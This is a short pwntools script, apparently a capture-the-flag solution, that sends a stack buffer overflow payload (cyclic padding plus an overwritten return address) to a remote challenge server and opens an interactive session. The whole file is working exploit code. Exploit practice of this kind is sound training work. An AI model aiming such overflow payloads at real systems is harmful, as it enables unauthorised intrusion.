from pwn import *

payload = cyclic(40) + p64(0x00000000004011b6)
target = remote("chall.codefest.tech", "8778")
target.sendline(payload)
target.interactive()
